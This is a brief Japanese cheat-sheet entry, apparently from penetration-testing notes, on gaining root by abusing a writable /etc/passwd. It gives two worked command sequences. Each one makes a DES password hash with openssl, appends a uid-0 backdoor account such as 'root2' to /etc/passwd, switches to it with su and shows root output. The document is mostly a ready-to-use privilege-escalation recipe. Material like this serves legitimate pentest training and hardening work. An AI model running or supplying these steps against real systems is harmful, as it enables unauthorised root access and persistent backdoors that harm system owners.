# パスワード認証の悪用
 /etc/passwdユーザーレコードの2列目にパスワードハッシュが存在する場合 、それは認証に有効とみなされ、/etc/shadow内の対応するエントリ（存在する場合）よりも優先されます。
 つまり、 /etc/passwdに書き込むことができれば、事実上、任意のアカウントに任意のパスワードを設定できることになります。
```bash
#Pattern1 
openssl passwd w00t
Fdzt.eqJQ4s0g
#この例ではDESで暗号化している

echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

su root2
Password: w00t

id
uid=0(root) gid=0(root) groups=0(root)

#Pattern2
ls -la /etc/passwd
-rw-r--rw- 1 root root 2295 Aug 29  2022 /etc/passwd

openssl passwd w00t
0kRES8Xi0ARK.
#この例ではDESで暗号化している

echo "root3:0kRES8Xi0ARK.:0:0:root:/root:/bin/bash" >> /etc/passwd

su root3
Password: w00t

id
uid=0(root) gid=0(root) groups=0(root)
```